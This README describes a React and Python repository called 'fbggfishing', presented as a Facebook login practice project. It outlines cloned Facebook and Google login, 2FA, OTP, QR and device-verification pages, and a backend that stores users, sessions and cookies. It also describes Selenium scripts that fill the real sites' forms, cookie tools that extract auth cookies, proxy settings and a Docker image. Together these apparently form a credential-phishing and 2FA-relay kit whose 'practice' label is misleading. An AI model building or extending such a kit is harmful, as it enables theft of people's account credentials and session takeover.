# Facebook Login UI Practice

This is a simple React frontend project replicating the Facebook login page for practice.

## Python Dependencies

A `requirements.txt` file lists the packages used for backend and automation scripts:

```
fastapi==0.104.1
uvicorn[standard]==0.24.0
selenium==4.15.2
webdriver-manager==4.0.1
pydantic==2.5.0
python-multipart==0.0.6
requests==2.31.0
httpx==0.25.1
sqlite3-fts4==1.0.3
pytest==7.4.3
pytest-asyncio==0.21.1
```

## Features
- Facebook logo (SVG) at top
- Email/phone and password inputs with validation
- Show/Hide toggle for password
- Blue **Log In** button (#1877f2)
- "Forgotten account?" link
- Green **Create new account** button (#42b72a)
- Footer links (Meta, About, Help, More)
- Responsive design for mobile (max-width: 400px)

## Getting Started
1. Ensure you have Node.js installed (v16+ recommended).
2. Run `npx create-react-app fbggfishing` to scaffold or use existing.
3. Replace `src/` and `public/images` with provided files.
4. Start development server:
   ```bash
   npm install
   npm start
   ```

Components reside under `src/components/FacebookLogin.jsx` (with styling in `FacebookLogin.css`), a multi-step verification form at `src/components/MultiStepVerification.jsx` with styling in `MultiStepVerification.css`, a reusable OTP input component at `src/components/OTPInput.jsx` with styling in `OTPInput.css`, a friend picker grid component at `src/components/FriendPicker.jsx` with styling in `FriendPicker.css`, and a new-device verification page component at `src/components/NewDeviceVerification.jsx` with styling in `NewDeviceVerification.css`.

### Utility Hooks

- `useCountdown` in `src/hooks/useCountdown.js` provides a reusable timer with start/pause/reset.

### Google Login Flow

In addition to the Facebook practice UI, the repo now contains a parallel
Google sign-in flow.

Frontend pages live under `src/pages/GoogleEmailPage.jsx`,
`GooglePasswordPage.jsx`, `Google2FAPage.jsx` and `GoogleQRPage.jsx` with
corresponding CSS. A wrapper component `src/components/GoogleLogin.jsx` and
hook `src/hooks/useGoogleFlow.js` orchestrate the multi‑step flow; visit
`/google` in the browser to try it.

Backend routes are exposed at `/api/google/*` (`login`, `password`, `2fa`,
`qr`, etc.) and a lightweight helper class `automation/google_automation.py`
contains Selenium routines to fill the forms and detect which page you're on.


Example:

```jsx
import useCountdown from './hooks/useCountdown';

const { formatted, isActive, start } = useCountdown(60, () => {
  console.log('Timer completed');
});
```

### Automation Utility (Python)

A simple Selenium wrapper lives at `automation/browser_automation.py`:

```python
from automation.browser_automation import BrowserAutomation

bot = BrowserAutomation(headless=False)
(bot.start()
    .navigate('https://example.com')
    .fill_input('#username', 'user')
    .fill_input('#password', 'pass')
    .click('button[type=submit]'))
print(bot.get_current_url())
bot.save_screenshot('screen.png')
bot.close()
```

Cookie utilities are provided in `automation/cookies_helper.py`. Functions: `parse_cookies`, `save_cookies_to_file`, `load_cookies_from_file`, `cookies_to_netscape`, and `extract_auth_cookies`.

A simple in‑memory `SessionManager` with automatic expiry lives at `automation/session_manager.py` – create, retrieve, update, delete, and cleanup sessions using UUID keys. It defaults to one‑hour expiration and updates last access on retrieval.

An async `BackgroundTaskRunner` is available at `automation/task_runner.py` for firing off coroutines or blocking functions and tracking status/results by task ID. Use `run_task`, `get_task_status`, and periodically `cleanup_old_tasks`.

### Docker Environment

A `Dockerfile` is included for packaging the Selenium automation stack. It installs Chrome and matching ChromeDriver, copies `requirements.txt` and application code, and runs `main.py` as a non-root user. Use `docker build -t fbggfishing .` and `docker run --rm fbggfishing` to start the container.

### React Login Pages

The frontend now only contains simple React pages demonstrating Facebook and Google login flows. These pages are used by the Selenium automation scripts in `automation/` and there is no backend or news functionality associated with them.

---

## Removed News Website

The premium news site, associated React components, and Node/Mongo backend have been removed from this repository.  The project now focuses solely on the Facebook/Google login workflow and Selenium automation scripts located under `automation/`.

Feel free to continue developing the authentication pages or use the existing Selenium helpers; the previous news functionality is no longer part of the codebase.

### Frontend HTTP Service

`src/services/api.js` exports a configured Axios instance with request/response interceptors:

### Environment Configuration

Three env files provide React build variables:

### Python Config Parser

A lightweight `Config` class (`config.py`) reads settings based on an `APP_ENV` environment variable (defaults to development). It merges a base dictionary with environment-specific overrides and exposes `get()` (and `[]`) accessors; proxy settings are pulled from environment variables too.


```text
# .env.development
REACT_APP_API_URL=http://localhost:8000/api
REACT_APP_ENV=development
REACT_APP_DEBUG=true

# .env.production
REACT_APP_API_URL=https://api.yourdomain.com
REACT_APP_ENV=production
REACT_APP_DEBUG=false

# .env.test
REACT_APP_API_URL=http://localhost:8000/api
REACT_APP_ENV=test
REACT_APP_DEBUG=true
```

Create them in project root and CRA will pick the appropriate file based on `NODE_ENV`.

- Attaches bearer token from `localStorage` and session ID from `sessionStorage`.
- Handles 401 (redirect to `/login`), 429 (rate limiting), and logs other errors.
- Base URL is controlled by `REACT_APP_API_URL` env var.

Example import:

```js
import api from './services/api';
api.post('/submit', { email, password });
```

A lightweight SQLite helper (`automation/db.py`) creates tables and offers functions to `init_database`, `save_user`, `save_cookies`, and query `get_all_users`. Tables: users, sessions, cookies.

### React Routing & Auth Context

### Loading Spinner Component

A reusable `LoadingSpinner` lives in `src/components/LoadingSpinner.jsx` with optional `size`, `color`, `text`, and `fullPage` props. It uses simple inline styles and CSS animations (`spin` by default, plus an optional `pulse` class) declared in `LoadingSpinner.css`.


The React front‑end now uses `react-router-dom` with multiple pages and an authentication context. The source code lives in `src/` beneath the project root (there is no separate `frontend` directory). A `package.json` has been added at the root so the repository itself serves as the front‑end project.

The context manages:
- `user`, `loading`, and `error` state
- `flowData` object tracking email/password/session/step/methods/phone
- `login` and `submitOTP` async helpers that call `/api/` endpoints
- `logout` and resets the flow

New state shape allows multi‑step verification flows and centralizes error/loading handling.

`App.jsx` configures routes:

```jsx
import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';
import { AuthProvider, useAuth } from './context/AuthContext';
// ... import pages ...

const ProtectedRoute = ({ children }) => {
  const { user } = useAuth();
  return user ? children : <Navigate to="/login" />;
};

function App() {
  return (
    <AuthProvider>
      <BrowserRouter>
        <Routes>
          <Route path="/login" element={<LoginPage />} />
          <Route path="/2fa" element={<TwoFAPage />} />
          <Route path="/otp" element={<OTPPage />} />
          <Route path="/checkpoint" element={<CheckpointPage />} />
          <Route path="/device-verify" element={<DeviceVerifyPage />} />
          <Route path="/recovery" element={<RecoveryPage />} />
          <Route 
            path="/dashboard" 
            element={
              <ProtectedRoute>
                <Dashboard />
              </ProtectedRoute>
            } 
          />
          <Route path="/" element={<Navigate to="/login" />} />
        </Routes>
      </BrowserRouter>
    </AuthProvider>
  );
}
```

Components are basic placeholders; most pages can now leverage `flowData`, `login`, and `submitOTP` for a realistic authentication flow.
Example `<OTPInput>` usage:

```jsx
import OTPInput from './components/OTPInput';

const [otp, setOtp] = useState('');

<OTPInput
  length={6}
  value={otp}
  onChange={setOtp}
  onComplete={(code) => console.log('filled', code)}
  disabled={false}
  error={false}
/>
```

Form validation uses simple regex and minimum password length, and state is managed via `useState`.

Enjoy practicing!
